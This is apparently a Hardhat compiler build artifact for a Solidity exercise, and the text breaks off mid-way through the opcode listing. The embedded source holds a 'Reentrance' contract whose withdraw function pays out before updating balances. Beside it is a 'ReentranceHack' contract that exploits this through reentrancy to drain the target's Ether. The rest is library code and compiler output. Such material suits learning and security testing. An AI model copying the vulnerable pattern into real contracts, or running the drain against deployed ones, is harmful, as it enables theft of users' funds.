{
	"id": "56a8155b9ba36a4fdd5444ed1c9cb2cc",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Reentrance.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\";\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n\ncontract ReentranceHack {\n\n  Reentrance private reentrance;\n\n  constructor(address payable _reentrance) public {\n    reentrance = Reentrance(_reentrance);\n  }\n\n  function attack() public payable {\n    reentrance.donate{value: msg.value}(address(this));\n    reentrance.withdraw(msg.value);\n\n    selfdestruct(payable(msg.sender));\n  }\n\n  receive() external payable {\n    uint256 balance = Math.min(address(reentrance).balance, msg.value);\n    if ( balance > 0 ) {\n      reentrance.withdraw(balance);\n    }\n  }\n}"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Standard math utilities missing in the Solidity language.\n */\nlibrary Math {\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    /**\n     * @dev Returns the smallest of two numbers.\n     */\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a < b ? a : b;\n    }\n\n    /**\n     * @dev Returns the average of two numbers. The result is rounded towards\n     * zero.\n     */\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b) / 2 can overflow, so we distribute\n        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);\n    }\n}\n"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Reentrance.sol": {
				"Reentrance": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_who",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "balance",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balances",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_to",
									"type": "address"
								}
							],
							"name": "donate",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_amount",
									"type": "uint256"
								}
							],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Reentrance.sol\":281:859  contract Reentrance {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Reentrance.sol\":281:859  contract Reentrance {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x362a95\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x27e235e3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x2e1a7d4d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Reentrance.sol\":383:482  function donate(address _to) public payable {... */\n    tag_3:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/Reentrance.sol\":338:378  mapping(address => uint) public balances */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_15\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrance.sol\":590:824  function withdraw(uint _amount) public {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_19\n      jump\t// in\n    tag_17:\n      stop\n        /* \"contracts/Reentrance.sol\":486:586  function balanceOf(address _who) public view returns (uint balance) {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_23\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrance.sol\":383:482  function donate(address _to) public payable {... */\n    tag_11:\n        /* \"contracts/Reentrance.sol\":449:477  balances[_to].add(msg.value) */\n      tag_25\n        /* \"contracts/Reentrance.sol\":467:476  msg.value */\n      callvalue\n        /* \"contracts/Reentrance.sol\":449:457  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":449:462  balances[_to] */\n      dup1\n        /* \"contracts/Reentrance.sol\":458:461  _to */\n      dup5\n        /* \"contracts/Reentrance.sol\":449:462  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":449:466  balances[_to].add */\n      tag_26\n      swap1\n        /* \"contracts/Reentrance.sol\":449:477  balances[_to].add(msg.value) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_25:\n        /* \"contracts/Reentrance.sol\":433:441  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":433:446  balances[_to] */\n      dup1\n        /* \"contracts/Reentrance.sol\":442:445  _to */\n      dup4\n        /* \"contracts/Reentrance.sol\":433:446  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Reentrance.sol\":433:477  balances[_to] = balances[_to].add(msg.value) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Reentrance.sol\":383:482  function donate(address _to) public payable {... */\n      pop\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":338:378  mapping(address => uint) public balances */\n    tag_15:\n      mstore(0x20, 0x00)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":590:824  function withdraw(uint _amount) public {... */\n    tag_19:\n        /* \"contracts/Reentrance.sol\":662:669  _amount */\n      dup1\n        /* \"contracts/Reentrance.sol\":638:646  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":638:658  balances[msg.sender] */\n      dup1\n        /* \"contracts/Reentrance.sol\":647:657  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":638:658  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":638:669  balances[msg.sender] >= _amount */\n      lt\n        /* \"contracts/Reentrance.sol\":635:820  if(balances[msg.sender] >= _amount) {... */\n      tag_28\n      jumpi\n        /* \"contracts/Reentrance.sol\":680:691  bool result */\n      0x00\n        /* \"contracts/Reentrance.sol\":696:706  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":696:711  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":718:725  _amount */\n      dup3\n        /* \"contracts/Reentrance.sol\":696:730  msg.sender.call{value:_amount}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_31\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_30)\n    tag_31:\n      0x60\n      swap2\n      pop\n    tag_30:\n      pop\n        /* \"contracts/Reentrance.sol\":679:730  (bool result,) = msg.sender.call{value:_amount}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/Reentrance.sol\":806:813  _amount */\n      dup2\n        /* \"contracts/Reentrance.sol\":782:790  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":782:802  balances[msg.sender] */\n      dup1\n        /* \"contracts/Reentrance.sol\":791:801  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":782:802  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/Reentrance.sol\":782:813  balances[msg.sender] -= _amount */\n      dup3\n      dup3\n      sload\n      sub\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Reentrance.sol\":635:820  if(balances[msg.sender] >= _amount) {... */\n      pop\n    tag_28:\n        /* \"contracts/Reentrance.sol\":590:824  function withdraw(uint _amount) public {... */\n      pop\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":486:586  function balanceOf(address _who) public view returns (uint balance) {... */\n    tag_23:\n        /* \"contracts/Reentrance.sol\":540:552  uint balance */\n      0x00\n        /* \"contracts/Reentrance.sol\":567:575  balances */\n      dup1\n        /* \"contracts/Reentrance.sol\":567:581  balances[_who] */\n      0x00\n        /* \"contracts/Reentrance.sol\":576:580  _who */\n      dup4\n        /* \"contracts/Reentrance.sol\":567:581  balances[_who] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":560:581  return balances[_who] */\n      swap1\n      pop\n        /* \"contracts/Reentrance.sol\":486:586  function balanceOf(address _who) public view returns (uint balance) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":867:1043  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_26:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":925:932  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":944:953  uint256 c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":960:961  b */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":956:957  a */\n      dup5\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":956:961  a + b */\n      add\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":944:961  uint256 c = a + b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":984:985  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":979:980  c */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":979:985  c >= a */\n      lt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":971:1017  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_35\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_35:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":1035:1036  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":1028:1036  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":867:1043  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220321f04d2e688bb4464e6cd65bba20aaf9ab8f977114e17fdeccd51c3239b960364736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061044a806100206000396000f3fe6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220321f04d2e688bb4464e6cd65bba20aaf9ab8f977114e17fdeccd51c3239b960364736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x44A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 